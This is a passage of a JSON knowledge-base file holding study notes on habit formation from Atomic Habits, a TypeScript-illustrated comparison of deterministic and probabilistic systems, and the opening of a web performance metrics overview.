Fallacies](https://en.wikipedia.org/wiki/List_of_fallacies)\n- [The Fallacy Files](http://www.fallacyfiles.org/)\n\n---\n\n"
    },
    {
      "id": "misc/mime-type-issues",
      "title": "Mime Type Issues",
      "path": [
        "misc",
        "mime-type-issues"
      ],
      "content": ""
    },
    {
      "id": "misc/productivity/atomic-habits",
      "title": "Atomic Habits: Habit Formation Guide",
      "path": [
        "misc",
        "productivity",
        "atomic-habits"
      ],
      "content": "# Atomic Habits: Habit Formation Guide\n\nAtomic Habits by James Clear presents a framework for building good habits and breaking bad ones through tiny, incremental changes. The core idea: small habits compound over time—1% better each day leads to 37x improvement in a year. Think of habits like atoms—individually small and seemingly insignificant, but when combined systematically, they create remarkable results.\n\n## Key Points\n\n- **1% Rule:** Small improvements compound exponentially over time\n- **Four Laws:** Make it obvious, attractive, easy, and satisfying\n- **Identity-Based:** Focus on who you want to become, not what you want to achieve\n- **Systems > Goals:** Goals are about results, systems are about processes\n- **Environment Design:** Make good habits inevitable and bad habits impossible\n\n## The Four Laws of Behavior Change\n\n### 1st Law: Make It Obvious\n\nMake cues for good habits visible and clear.\n\n```\nBAD HABIT (Hide the Cue):\n- Want to quit snacking?\n  → Remove junk food from sight\n  → Put healthy snacks at eye level\n\nGOOD HABIT (Make the Cue Obvious):\n- Want to exercise in morning?\n  → Put workout clothes next to bed\n  → Leave running shoes by door\n  \n- Want to read more?\n  → Place book on pillow\n  → Remove phone from bedroom\n  \n- Want to drink more water?\n  → Fill water bottle night before\n  → Place it on desk in morning\n```\n\n**Implementation Intentions:** \"I will [BEHAVIOR] at [TIME] in [LOCATION]\"\n\n```\nExamples:\n- \"I will meditate for 5 minutes at 7am in my bedroom\"\n- \"I will write 500 words at 9am in my office\"\n- \"I will exercise for 20 minutes at 6pm in my living room\"\n\nWhy it works: Removes decision-making, creates automatic trigger\n```\n\n**Habit Stacking:** Link new habit to existing one\n\n```\nFormula: \"After [CURRENT HABIT], I will [NEW HABIT]\"\n\nExamples:\n- \"After I pour my coffee, I will meditate for 2 minutes\"\n- \"After I sit down for dinner, I will say one thing I'm grateful for\"\n- \"After I close my laptop, I will do 10 pushups\"\n- \"After I brush my teeth, I will floss one tooth\"\n\nChain multiple habits:\nMorning routine:\n1. Wake up → Make bed\n2. Make bed → Drink water\n3. Drink water → Meditate\n4. Meditate → Exercise\n```\n\n### 2nd Law: Make It Attractive\n\nIncrease desire for good habits.\n\n```\nTEMPTATION BUNDLING:\nPair habit you NEED to do with habit you WANT to do\n\nFormula: \"After [HABIT I NEED], I will [HABIT I WANT]\"\n\nExamples:\n- \"After I exercise for 30 minutes, I will watch Netflix\"\n- \"After I write for 1 hour, I will check social media\"\n- \"After I study for 45 minutes, I will play video games for 15\"\n\nAdvanced:\n- Only listen to audiobooks while exercising\n- Only get massage after completing work project\n- Only watch favorite show while on treadmill\n```\n\n**Join a Culture Where Desired Behavior Is Normal**\n\n```\n- Want to run regularly? Join running club\n- Want to read more? Join book club\n- Want to code better? Join developer community\n- Want to eat healthy? Hang out with health-conscious friends\n\nSocial proof: We imitate the habits of three groups:\n1. The close (family/friends)\n2. The many (tribe)\n3. The powerful (status/success)\n```\n\n**Reframe Your Mindset**\n\n```\nChange \"have to\" → \"get to\"\n\n❌ \"I have to wake up early\"\n✅ \"I get to wake up early and have quiet time\"\n\n❌ \"I have to exercise\"\n✅ \"I get to build a strong body\"\n\n❌ \"I have to save money\"\n✅ \"I get to build financial freedom\"\n\nHighlight benefits, not burdens\n```\n\n### 3rd Law: Make It Easy\n\nReduce friction for good habits, increase friction for bad habits.\n\n```\nTWO-MINUTE RULE:\nScale habit down to 2 minutes\n\nGoal: Read 30 books/year\n→ Start: Read 1 page (2 minutes)\n\nGoal: Run a marathon\n→ Start: Put on running shoes (2 minutes)\n\nGoal: Eat healthy\n→ Start: Eat one vegetable (2 minutes)\n\nGoal: Meditate daily\n→ Start: Breathe deeply once (2 minutes)\n\nPrinciple: Master showing up, scale up later\n```\n\n**Reduce Friction (Good Habits)**\n\n```\n- Want to exercise?\n  → Sleep in workout clothes\n  → Join gym on way to work (not 20 min away)\n  \n- Want to eat healthy?\n  → Prep meals on Sunday\n  → Cut vegetables in advance\n  \n- Want to practice guitar?\n  → Leave guitar on stand (not in case)\n  → Keep in living room (not closet)\n\nEach step of friction = less likely to do it\n```\n\n**Increase Friction (Bad Habits)**\n\n```\n- Want to quit social media?\n  → Delete apps from phone\n  → Use website blockers\n  → Log out after each use\n  \n- Want to watch less TV?\n  → Unplug TV after each use\n  → Remove batteries from remote\n  → Only turn on for specific shows\n  \n- Want to stop checking phone?\n  → Leave in another room\n  → Turn off notifications\n  → Use grayscale mode\n\nAdd steps between you and bad habit\n```\n\n**Automate Good Habits**\n\n```\nTechnology one-time actions with lasting impact:\n\n- Auto-transfer $50 to savings each paycheck\n- Schedule recurring grocery delivery (healthy foods)\n- Set up automatic bill payments\n- Use app blockers during work hours\n- Set phone to Do Not Disturb automatically\n\nMake good behavior the default option\n```\n\n### 4th Law: Make It Satisfying\n\nCreate immediate rewards for good habits.\n\n```\nIMMEDIATE REWARD:\nOur brain prioritizes immediate gratification\n\nBad habits feel good NOW, feel bad LATER\n- Eating junk food: tastes good → weight gain later\n- Scrolling social media: entertaining → wasted time later\n\nGood habits feel bad NOW, feel good LATER\n- Exercise: uncomfortable → health later\n- Saving money: restrictive → wealth later\n\nSolution: Add immediate pleasure to good habits\n\nExamples:\n- After workout → Smoothie you enjoy\n- After saving $100 → Check balance (satisfying number)\n- After writing → Cross off calendar (visual progress)\n```\n\n**Habit Tracking (Visual Satisfaction)**\n\n```\nTrack completion daily - seeing progress is rewarding\n\nMethods:\n1. Calendar X's\n   - Mark X on calendar each day completed\n   - \"Don't break the chain\"\n   \n2. Habit tracker app\n   - Streaks, Habitica, Way of Life\n   \n3. Physical tracker\n   - Paper clip method: Move clip for each rep\n   - Marble jar: Add marble each completion\n\nWhy it works:\n- Visual proof of progress\n- Satisfying to mark complete\n- Don't want to break streak\n```\n\n**Never Miss Twice Rule**\n\n```\nMissing once = accident\nMissing twice = new habit\n\nBad days will happen:\n- Sick, travel, emergencies\n\nRule: Never miss two days in row\n\nExamples:\n- Missed gym Monday? MUST go Tuesday\n- Skipped meditation? Do 1 minute next day\n- Ate junk food? Eat healthy next meal\n\nProgress requires consistency, not perfection\n```\n\n**Accountability Partner**\n\n```\nMake cost of bad behavior public/immediate\n\nMethods:\n1. Habit contract\n   - Sign agreement with partner\n   - If missed: Pay $50 to charity you hate\n   \n2. Public commitment\n   - Post goals on social media\n   - Weekly updates to friend\n   \n3. Workout buddy\n   - Schedule together\n   - Letting them down = social cost\n\nPain of failure > Pain of action = More likely to act\n```\n\n## Identity-Based Habits\n\nFocus on WHO you want to become, not WHAT you want to achieve.\n\n```\nOUTCOME-BASED (Less Effective):\n- \"I want to lose 20 pounds\"\n- \"I want to read 50 books\"\n- \"I want to run a marathon\"\n\nIDENTITY-BASED (More Effective):\n- \"I am a healthy person\"\n- \"I am a reader\"\n- \"I am a runner\"\n\nWhy better?\n- Outcomes are temporary, identity is permanent\n- Identity drives behavior automatically\n- \"I'm trying to quit smoking\" vs \"I'm not a smoker\"\n```\n\n**Building Identity Through Habits**\n\n```\nEvery action is a vote for the person you want to become\n\nWant to be a writer?\n- Write 100 words → +1 vote for \"writer\" identity\n- Write 500 words → +1 vote\n- Write daily for week → +7 votes\n\nWant to be healthy?\n- Choose salad → +1 vote for \"healthy person\"\n- Go to gym → +1 vote\n- Get 8hr sleep → +1 vote\n\nAccumulate evidence of your identity through small wins\n```\n\n## The Plateau of Latent Potential\n\n```\nEXPECTATION:\nProgress\n    ↗\n  ↗\n↗\n\nREALITY:\nProgress              ↗↗↗ Breakthrough!\n           __________\n         /\n       /\n_____/\n    ↑\nValley of Disappointment\n\nMost people quit here ↑\n\nIce cube analogy:\n- 25°F → No change\n- 26°F → No change\n- 27°F → No change\n- 31°F → No change\n- 32°F → ICE MELTS! Massive change\n\nHabits appear to make no difference until critical threshold\n```\n\n## Environment Design\n\nYour environment shapes your behavior more than motivation.\n\n```\nPRINCIPLE:\nMake good habits:\n- Obvious (visible cues)\n- Easy (reduce friction)\n- Satisfying (immediate reward)\n\nMake bad habits:\n- Invisible (remove cues)\n- Difficult (add friction)\n- Unsatisfying (immediate cost)\n\nKITCHEN EXAMPLE:\n\nGood habit (eat fruit):\n✅ Keep fruit bowl on counter (obvious)\n✅ Pre-wash and cut (easy)\n✅ Buy favorite fruits (satisfying)\n\nBad habit (eat cookies):\n✅ Don't buy cookies (invisible)\n✅ If must have: Put on high shelf (difficult)\n✅ Buy individual packets, not bulk (unsatisfying/expensive)\n```\n\n**One Space, One Use**\n\n```\nDesignate specific spaces for specific activities:\n\n- Desk = Work only (not Netflix)\n- Bed = Sleep only (not scrolling phone)\n- Couch = Relax only (not work email)\n\nTrain brain: This environment = This behavior\n```\n\n## Habit Stacking Template\n\n```\nMORNING ROUTINE EXAMPLE:\n\nAfter I [wake up], I will [drink water]\nAfter I [drink water], I will [make bed]\nAfter I [make bed], I will [meditate 2 min]\nAfter I [meditate], I will [exercise 10 min]\nAfter I [exercise], I will [shower]\nAfter I [shower], I will [make coffee]\nAfter I [make coffee], I will [journal 5 min]\nAfter I [journal], I will [start work]\n\nEach habit triggers the next\nTime required: ~30 minutes\nCompound effect: Massive over months\n```\n\n## Breaking Bad Habits (Inversion)\n\n```\n1st Law: Make it INVISIBLE\n- Remove cues from environment\n- Reduce exposure to triggers\n\n2nd Law: Make it UNATTRACTIVE\n- Reframe mindset\n- Highlight negative consequences\n\n3rd Law: Make it DIFFICULT\n- Add friction\n- Increase steps required\n\n4th Law: Make it UNSATISFYING\n- Create accountability\n- Immediate cost for failure\n\nEXAMPLE: Quit phone scrolling\n\nInvisible:\n- Delete social media apps\n- Turn off all notifications\n\nUnattractive:\n- Calculate time wasted weekly\n- List what you didn't accomplish\n\nDifficult:\n- Log out after each use\n- Put phone in different room\n- Use app blocker\n\nUnsatisfying:\n- Tell friend goal\n- Pay $10 to charity if exceed limit\n```\n\n## Practical Implementation\n\n### Week 1: Habit Stacking\n\n```\nPick ONE habit to add to existing routine:\n\nCurrent: Brush teeth\nNew: Floss one tooth\n\nAfter I [brush teeth], I will [floss one tooth]\n\nThat's it. Just one tooth. Build from there.\n```\n\n### Week 2: Two-Minute Rule\n\n```\nScale down your habit to 2 minutes:\n\nWant to: Exercise 30min/day\nStart with: Put on workout clothes\nDo this for: 1 week\n\nWeek 3: Add 5min of actual exercise\nWeek 4: Add 10min\nWeek 5: Add 15min\n```\n\n### Week 3: Environment Design\n\n```\nGood habit:\n- Make cue visible in current environment\nExample: Leave book on pillow\n\nBad habit:\n- Remove cue from environment\nExample: Delete Instagram app\n```\n\n### Week 4: Habit Tracking\n\n```\nBuy a calendar\nMark X each day you complete habit\nGoal: Don't break the chain\n\nMissed a day?\nApply \"Never Miss Twice\" rule\n```\n\n## References\n\n- [Atomic Habits by James Clear](https://jamesclear.com/atomic-habits)\n- [James Clear's Website](https://jamesclear.com)\n- [Habit Stacking Guide](https://jamesclear.com/habit-stacking)\n\n---\n\n## Summary\n\n**Core Formula:** Tiny changes + Time = Remarkable results\n\n**Four Laws:**\n1. Make it Obvious → Implementation intentions, habit stacking\n2. Make it Attractive → Temptation bundling, join supportive culture\n3. Make it Easy → Two-minute rule, reduce friction\n4. Make it Satisfying → Habit tracking, immediate rewards\n\n**Key Insight:** You don't rise to your goals, you fall to your systems.\n\n**Start:** One tiny habit today. Stack tomorrow. Compound over time."
    },
    {
      "id": "misc/vocab/determanistic-vs-probabalistic",
      "title": "Deterministic vs Probabilistic Systems: Complete Overview",
      "path": [
        "misc",
        "vocab",
        "determanistic-vs-probabalistic"
      ],
      "content": "# Deterministic vs Probabilistic Systems: Complete Overview\n\nDeterministic and probabilistic systems represent two fundamentally different approaches to modeling and understanding phenomena. Deterministic systems produce the same output given the same input every time, following fixed rules with no randomness. Probabilistic (stochastic) systems incorporate randomness and uncertainty, producing outputs that vary even with identical inputs. Think of deterministic as a vending machine—press B3, always get chips—while probabilistic is like rolling dice—same action, different outcomes each time.\n\n## Key Points\n\n- **Deterministic:** Same input → same output, predictable, no randomness\n- **Probabilistic:** Same input → variable output, involves uncertainty/randomness\n- **Predictability:** Deterministic is fully predictable, probabilistic uses probability distributions\n- **Real World:** Most complex systems are probabilistic, simplified models are deterministic\n- **Applications:** Both used depending on required accuracy and complexity\n\n## High-Level Overview\n\n### What is a Deterministic System?\n\nA deterministic system follows precise, repeatable rules where the outcome is completely determined by the initial conditions and inputs. There is no randomness or uncertainty—given the same starting point, you'll always reach the same conclusion.\n\n**Core concept:** If you know the current state and the rules, you can predict the future state with 100% certainty.\n\n```\nDeterministic Examples:\n- Calculator: 2 + 2 always equals 4\n- Computer program (without random functions): Same input → same output\n- Classical physics: F = ma (given force and mass, acceleration is determined)\n- Sorting algorithm: Same array always sorted the same way\n```\n\n### What is a Probabilistic System?\n\nA probabilistic (stochastic) system incorporates randomness and uncertainty. The outcome is not fixed but follows a probability distribution—you can predict the likelihood of different outcomes, but not the exact result.\n\n**Core concept:** Given the same inputs, outputs vary according to probability distributions. You can predict probabilities, not certainties.\n\n```\nProbabilistic Examples:\n- Dice roll: Same action, random outcome (1-6)\n- Weather forecast: 70% chance of rain\n- Machine learning: Model predictions include uncertainty\n- Quantum mechanics: Particle behavior described by probabilities\n```\n\n### Why Both Matter\n\n```\nDeterministic advantages:\n✅ Predictable and reliable\n✅ Easier to debug and verify\n✅ Simpler to understand\n✅ Reproducible results\n\nProbabilistic advantages:\n✅ Models real-world uncertainty\n✅ More realistic for complex systems\n✅ Better for noisy data\n✅ Enables risk assessment\n```\n\n## Similarities\n\n### 1. Both Follow Rules\n\n```\nDeterministic: Fixed rules\nInput: 5\nRule: output = input × 2\nOutput: 10 (always)\n\nProbabilistic: Statistical rules\nInput: 5\nRule: output = input × random(1, 2)\nOutput: 5-10 (follows probability distribution)\n\nCommon ground: Both have defined processes\nDifference: Deterministic = exact, Probabilistic = distribution\n```\n\n### 2. Both Can Be Modeled Mathematically\n\n```javascript\n// Deterministic function\nfunction calculateArea(radius: number): number {\n  return Math.PI * radius ** 2;\n}\n\nconsole.log(calculateArea(5));  // Always 78.54...\n\n// Probabilistic function\nfunction estimateArea(radius: number): number {\n  const noise = (Math.random() - 0.5) * 2;  // -1 to 1\n  return Math.PI * radius ** 2 + noise;\n}\n\nconsole.log(estimateArea(5));  // Varies: 77.5, 79.2, 78.1...\n\n// Both use mathematical formulas\n// Deterministic: Exact formula\n// Probabilistic: Formula + randomness\n```\n\n### 3. Both Can Make Predictions\n\n```typescript\n// Deterministic prediction\nfunction predictPosition(\n  initialPosition: number,\n  velocity: number,\n  time: number\n): number {\n  return initialPosition + velocity * time;  // Exact prediction\n}\n\npredictPosition(0, 10, 5);  // Always 50\n\n// Probabilistic prediction\nfunction predictSales(\n  historicalAverage: number,\n  uncertainty: number\n): number {\n  const randomFactor = Math.random() * uncertainty;\n  return historicalAverage + randomFactor - uncertainty / 2;\n}\n\npredictSales(1000, 200);  // Range: 900-1100\n\n// Both predict future states\n// Deterministic: Single precise value\n// Probabilistic: Range or distribution\n```\n\n### 4. Both Used in Science and Engineering\n\n```\nPhysics:\n- Deterministic: Classical mechanics (F = ma)\n- Probabilistic: Quantum mechanics (wave function)\n\nComputer Science:\n- Deterministic: Sorting algorithms\n- Probabilistic: Randomized algorithms, AI/ML\n\nFinance:\n- Deterministic: Compound interest calculation\n- Probabilistic: Stock price models, risk assessment\n\nMedicine:\n- Deterministic: Drug dosage calculations\n- Probabilistic: Disease outbreak modeling\n```\n\n## Differences\n\n### 1. Predictability\n\n```typescript\n// Deterministic: 100% predictable\nfunction add(a: number, b: number): number {\n  return a + b;\n}\n\nconsole.log(add(2, 3));  // 5\nconsole.log(add(2, 3));  // 5\nconsole.log(add(2, 3));  // 5\n// Always the same\n\n// Probabilistic: Outcome varies\nfunction rollDice(): number {\n  return Math.floor(Math.random() * 6) + 1;\n}\n\nconsole.log(rollDice());  // 4\nconsole.log(rollDice());  // 1\nconsole.log(rollDice());  // 6\n// Different each time\n\n// Key difference:\n// Deterministic: Certainty\n// Probabilistic: Probability distribution\n```\n\n### 2. Reproducibility\n\n```typescript\n// Deterministic: Always reproducible\nfunction fibonacci(n: number): number {\n  if (n <= 1) return n;\n  return fibonacci(n - 1) + fibonacci(n - 2);\n}\n\nfibonacci(10);  // 55\nfibonacci(10);  // 55 (exact same result)\n\n// Probabilistic: Not reproducible without seed\nfunction randomFibonacci(n: number): number {\n  if (n <= 1) return n;\n  const noise = Math.random() * 0.1;\n  return fibonacci(n - 1) + fibonacci(n - 2) + noise;\n}\n\nrandomFibonacci(10);  // 55.03\nrandomFibonacci(10);  // 55.07 (different)\n\n// Reproducible with seed\nclass SeededRandom {\n  private seed: number;\n  \n  constructor(seed: number) {\n    this.seed = seed;\n  }\n  \n  next(): number {\n    this.seed = (this.seed * 9301 + 49297) % 233280;\n    return this.seed / 233280;\n  }\n}\n\nconst rng = new SeededRandom(42);\nconsole.log(rng.next());  // 0.6372...\nconst rng2 = new SeededRandom(42);\nconsole.log(rng2.next());  // 0.6372... (same with same seed)\n```\n\n### 3. Output Characteristics\n\n```\nDeterministic:\n├─ Single precise value\n├─ No range or distribution\n└─ Repeatable\n\nExamples:\n2 + 2 = 4\nsort([3,1,2]) = [1,2,3]\ncalculateTax(100000, 0.25) = 25000\n\nProbabilistic:\n├─ Range of possible values\n├─ Probability distribution\n└─ Statistical properties\n\nExamples:\nflip(coin) → P(heads) = 0.5, P(tails) = 0.5\nweatherForecast() → 70% rain, 30% no rain\nstockPrice(tomorrow) → Normal(μ=100, σ=5)\n```\n\n### 4. When Each Is Used\n\n```typescript\n// Deterministic: When exact answers needed\nclass Calculator {\n  add(a: number, b: number): number {\n    return a + b;  // Must be exact\n  }\n  \n  compound(principal: number, rate: number, time: number): number {\n    return principal * Math.pow(1 + rate, time);  // Exact calculation\n  }\n}\n\n// Financial calculations must be deterministic\nconst finalAmount = calculator.compound(1000, 0.05, 10);\n// Always: 1628.89\n\n// Probabilistic: When modeling uncertainty\nclass WeatherModel {\n  predictRain(\n    humidity: number,\n    temperature: number,\n    pressure: number\n  ): number {\n    // Complex model with uncertainty\n    const baseProb = this.calculateBaseProbability(humidity, temperature);\n    const uncertainty = Math.random() * 0.1 - 0.05;\n    return Math.max(0, Math.min(1, baseProb + uncertainty));\n  }\n}\n\n// Weather inherently uncertain\nconst rainChance = weatherModel.predictRain(80, 20, 1013);\n// Might be: 0.72, 0.68, 0.75 (varies)\n```\n\n### 5. Testing and Debugging\n\n```typescript\n// Deterministic: Easy to test\nfunction calculateDiscount(price: number, percentage: number): number {\n  return price * (percentage / 100);\n}\n\ntest('calculateDiscount', () => {\n  expect(calculateDiscount(100, 10)).toBe(10);  // Always passes\n  expect(calculateDiscount(50, 20)).toBe(10);   // Repeatable\n});\n\n// Probabilistic: Harder to test\nfunction estimateDeliveryTime(distance: number): number {\n  const baseTime = distance / 60;  // hours at 60 mph\n  const trafficDelay = Math.random() * 0.5;  // 0-30 min\n  return baseTime + trafficDelay;\n}\n\ntest('estimateDeliveryTime', () => {\n  const result = estimateDeliveryTime(120);\n  // Can't test exact value, test range or statistics\n  expect(result).toBeGreaterThan(2);\n  expect(result).toBeLessThan(2.5);\n  \n  // Or test statistical properties\n  const results = Array(1000).fill(0).map(() => estimateDeliveryTime(120));\n  const average = results.reduce((a, b) => a + b) / results.length;\n  expect(average).toBeCloseTo(2.25, 1);  // Mean should be ~2.25\n});\n```\n\n### 6. Computational Complexity\n\n```typescript\n// Deterministic: Time complexity is fixed\nfunction binarySearch(arr: number[], target: number): number {\n  let left = 0, right = arr.length - 1;\n  \n  while (left <= right) {\n    const mid = Math.floor((left + right) / 2);\n    if (arr[mid] === target) return mid;\n    if (arr[mid] < target) left = mid + 1;\n    else right = mid - 1;\n  }\n  return -1;\n}\n\n// Always O(log n) for same input size\n\n// Probabilistic: Expected time complexity\nfunction quickSort(arr: number[]): number[] {\n  if (arr.length <= 1) return arr;\n  \n  // Random pivot selection (probabilistic)\n  const pivotIndex = Math.floor(Math.random() * arr.length);\n  const pivot = arr[pivotIndex];\n  \n  const left = arr.filter((x, i) => x < pivot && i !== pivotIndex);\n  const right = arr.filter((x, i) => x >= pivot && i !== pivotIndex);\n  \n  return [...quickSort(left), pivot, ...quickSort(right)];\n}\n\n// Average O(n log n), worst O(n²) - depends on random pivots\n```\n\n### 7. Machine Learning Context\n\n```typescript\n// Deterministic ML: Decision Tree (without randomness)\nclass DecisionTreeNode {\n  predict(features: number[]): string {\n    if (features[0] > 50) {\n      if (features[1] > 30) return 'Class A';\n      return 'Class B';\n    }\n    return 'Class C';\n  }\n}\n\nconst tree = new DecisionTreeNode();\ntree.predict([60, 40]);  // Always 'Class A'\n\n// Probabilistic ML: Neural Network with Dropout\nclass NeuralNetwork {\n  predict(input: number[], training: boolean = false): number[] {\n    let activation = this.forward(input);\n    \n    if (training) {\n      // Dropout: randomly zero out neurons (probabilistic)\n      activation = activation.map(x => \n        Math.random() > 0.5 ? x : 0\n      );\n    }\n    \n    return this.softmax(activation);  // Probability distribution\n  }\n}\n\nconst nn = new NeuralNetwork();\nnn.predict([1, 2, 3], true);  // [0.2, 0.5, 0.3] (varies)\nnn.predict([1, 2, 3], false); // [0.25, 0.45, 0.3] (stable)\n```\n\n## Practical Examples\n\n### Example 1: Route Navigation\n\n```typescript\n// Deterministic: Shortest path algorithm\nclass DeterministicRouter {\n  findShortestPath(start: string, end: string): Path {\n    // Dijkstra's algorithm - always same result\n    const distances = this.calculateDistances(start);\n    return this.reconstructPath(distances, end);\n  }\n}\n\nconst router = new DeterministicRouter();\nrouter.findShortestPath('A', 'Z');\n// Always returns exact same path: A → B → D → Z\n\n// Probabilistic: Traffic-aware routing\nclass ProbabilisticRouter {\n  findFastestPath(start: string, end: string): Path {\n    // Considers traffic (random variable)\n    const paths = this.getAllPaths(start, end);\n    \n    return paths.map(path => ({\n      path,\n      estimatedTime: this.estimateTime(path),  // Includes traffic randomness\n      probability: this.calculateProbability(path)\n    })).sort((a, b) => a.estimatedTime - b.estimatedTime)[0].path;\n  }\n  \n  estimateTime(path: Path): number {\n    const baseTime = path.distance / 60;\n    const trafficDelay = this.simulateTraffic();  // Random\n    return baseTime + trafficDelay;\n  }\n}\n\nconst probRouter = new ProbabilisticRouter();\nprobRouter.findFastestPath('A', 'Z');\n// Might suggest: A → C → E → Z (varies with traffic)\n```\n\n### Example 2: Game AI\n\n```typescript\n// Deterministic AI: Chess engine (minimax)\nclass DeterministicChessAI {\n  getBestMove(board: Board): Move {\n    return this.minimax(board, 10);  // Always same move for same position\n  }\n  \n  minimax(board: Board, depth: number): Move {\n    // Evaluates all possibilities deterministically\n    const moves = board.getLegalMoves();\n    const evaluations = moves.map(move => ({\n      move,\n      score: this.evaluatePosition(board.makeMove(move))\n    }));\n    \n    return evaluations.sort((a, b) => b.score - a.score)[0].move;\n  }\n}\n\n// Probabilistic AI: Monte Carlo Tree Search\nclass ProbabilisticGameAI {\n  getBestMove(board: Board): Move {\n    const simulations = 10000;\n    const stats = new Map<Move, { wins: number; plays: number }>();\n    \n    for (let i = 0; i < simulations; i++) {\n      const move = this.selectMove(board);\n      const result = this.simulateRandomGame(board, move);  // Random\n      \n      const stat = stats.get(move) || { wins: 0, plays: 0 };\n      stat.plays++;\n      if (result === 'win') stat.wins++;\n      stats.set(move, stat);\n    }\n    \n    // Choose move with highest win rate\n    return Array.from(stats.entries())\n      .sort((a, b) => (b[1].wins / b[1].plays) - (a[1].wins / a[1].plays))[0][0];\n  }\n}\n```\n\n### Example 3: A/B Testing\n\n```typescript\n// Deterministic: User always sees same version\nclass DeterministicABTest {\n  getVariant(userId: string): 'A' | 'B' {\n    // Hash user ID to get consistent variant\n    const hash = this.hashCode(userId);\n    return hash % 2 === 0 ? 'A' : 'B';\n  }\n  \n  hashCode(str: string): number {\n    let hash = 0;\n    for (let i = 0; i < str.length; i++) {\n      hash = ((hash << 5) - hash) + str.charCodeAt(i);\n    }\n    return Math.abs(hash);\n  }\n}\n\nconst detTest = new DeterministicABTest();\ndetTest.getVariant('user123');  // Always 'A'\ndetTest.getVariant('user123');  // Always 'A'\n\n// Probabilistic: Random assignment\nclass ProbabilisticABTest {\n  getVariant(): 'A' | 'B' {\n    return Math.random() < 0.5 ? 'A' : 'B';\n  }\n}\n\nconst probTest = new ProbabilisticABTest();\nprobTest.getVariant();  // Might be 'A'\nprobTest.getVariant();  // Might be 'B'\n// Each visit is random\n```\n\n### Example 4: Password Validation\n\n```typescript\n// Deterministic: Password strength checker\nclass PasswordValidator {\n  calculateStrength(password: string): number {\n    let strength = 0;\n    \n    if (password.length >= 8) strength += 20;\n    if (password.length >= 12) strength += 20;\n    if (/[a-z]/.test(password)) strength += 20;\n    if (/[A-Z]/.test(password)) strength += 20;\n    if (/[0-9]/.test(password)) strength += 10;\n    if (/[^a-zA-Z0-9]/.test(password)) strength += 10;\n    \n    return strength;\n  }\n}\n\nconst validator = new PasswordValidator();\nvalidator.calculateStrength('MyP@ss123');  // Always 100\n\n// Probabilistic: Password cracking time estimate\nclass PasswordCracker {\n  estimateCrackTime(password: string): { min: number; max: number; avg: number } {\n    const charset = this.determineCharset(password);\n    const combinations = Math.pow(charset, password.length);\n    \n    // Assumes random guessing rate with uncertainty\n    const guessesPerSecond = 1e9;  // 1 billion guesses/sec\n    \n    const baseTime = combinations / guessesPerSecond;\n    const uncertainty = Math.random() * 0.3;  // ±30% uncertainty\n    \n    return {\n      min: baseTime * (1 - uncertainty),\n      max: baseTime * (1 + uncertainty),\n      avg: baseTime\n    };\n  }\n}\n```\n\n## When to Use Which\n\n```typescript\n// Use DETERMINISTIC when:\n\n// 1. Exact results required\nfunction calculateTax(income: number, rate: number): number {\n  return income * rate;  // Must be exact, no variation\n}\n\n// 2. Reproducibility critical\nfunction encryptData(data: string, key: string): string {\n  // Encryption must be deterministic for decryption\n  return deterministicEncrypt(data, key);\n}\n\n// 3. Debugging and testing important\nfunction processPayment(amount: number): Receipt {\n  // Must work exactly same way every time for auditing\n  return createReceipt(amount);\n}\n\n// Use PROBABILISTIC when:\n\n// 1. Modeling real-world uncertainty\nfunction predictWeather(conditions: Conditions): Forecast {\n  // Weather inherently uncertain\n  return { rainProbability: 0.7, temperature: [18, 22] };\n}\n\n// 2. Dealing with incomplete information\nfunction recommendProduct(userHistory: Purchase[]): Product[] {\n  // User preferences have uncertainty\n  return probabilisticRecommendations(userHistory);\n}\n\n// 3. Optimization through randomness\nfunction simulatePortfolio(stocks: Stock[]): number {\n  // Monte Carlo simulation for risk assessment\n  return randomSimulation(stocks);\n}\n\n// 4. Machine learning with noisy data\nfunction trainModel(data: TrainingData): Model {\n  // Data has inherent noise and uncertainty\n  return probabilisticModel(data);\n}\n```\n\n## Common Pitfalls\n\n- Treating probabilistic systems as deterministic (expecting exact repeatability)\n- Not seeding random number generators when reproducibility needed\n- Ignoring uncertainty in probabilistic predictions\n- Over-simplifying complex systems with deterministic models\n- Using deterministic models where randomness is essential\n- Forgetting to test statistical properties of probabilistic systems\n- Not accounting for edge cases in deterministic systems\n\n## Practical Applications\n\n**Deterministic:**\n- Calculators and math operations\n- Cryptographic hashing\n- Database transactions\n- Compilers and interpreters\n- Sorting and searching algorithms\n\n**Probabilistic:**\n- Weather forecasting\n- Machine learning models\n- Financial risk assessment\n- Quantum computing\n- Network traffic simulation\n- Disease spread modeling\n\n## References\n\n- [Stochastic vs Deterministic Models](https://en.wikipedia.org/wiki/Stochastic_process)\n- [Deterministic System](https://en.wikipedia.org/wiki/Deterministic_system)\n- [Probability Theory Basics](https://www.probabilitycourse.com/)\n- [Monte Carlo Methods](https://en.wikipedia.org/wiki/Monte_Carlo_method)\n\n---\n\n## Summary Table\n\n| Aspect | Deterministic | Probabilistic |\n|--------|--------------|---------------|\n| **Output** | Same input → same output | Same input → variable output |\n| **Predictability** | 100% certain | Probability distribution |\n| **Reproducibility** | Always reproducible | Needs seed for reproduction |\n| **Testing** | Exact value checks | Statistical tests |\n| **Use Case** | Calculations, logic | Forecasting, ML, simulation |\n| **Complexity** | Fixed time/space | Expected time/space |\n| **Real World** | Simplified models | Complex systems |\n| **Examples** | 2+2=4, sorting | Dice roll, weather |"
    },
    {
      "id": "misc/web/web-metrics",
      "title": "Web Performance Metrics: Complete Overview",
      "path": [
        "misc",
        "web",
        "web-metrics"
      ],
      "content": "# Web Performance Metrics: Complete Overview\n\nWeb performance metrics are measurements that quantify how fast and responsive a website feels to users. Core Web Vitals—introduced by Google—focus on three key aspects: loading (LCP), interactivity (INP), and visual stability (CLS). These metrics directly impact user experience and SEO rankings. Think of them like vital signs at a doctor's office—just as heart rate, blood pressure, and temperature indicate health, these metrics indicate your website's performance health.\n\n## Key Points\n\n- **LCP (Largest Contentful Paint):** Measures loading speed of main content\n- **INP (Interaction to Next Paint):** Measures responsiveness to user interactions\n- **CLS (Cumulative Layout Shift):** Measures visual stability during loading\n- **FCP (First Contentful Paint):** When first content appears on screen\n- **TTFB (Time to First Byte):** Server response time\n\n## High-Level Overview\n\n### What Are Web Performance Metrics?\n\nWeb performance metrics are standardized measurements that track how users experience your website. They capture different aspects of the loading process, from server response to final rendering, helping developers identify bottlenecks and optimize user experience.\n\n**Core concept:** These metrics translate technical performance into user-perceived experience. A fast server response means nothing if the page layout keeps shifting while loading.\n\n### Why They Matter\n\n- **User Experience:** 53% of mobile users abandon sites that take over 3 seconds to load\n- **SEO Impact:** Google uses Core Web Vitals as ranking factors\n- **Conversion Rates:** Amazon found 100ms delay = 1% revenue 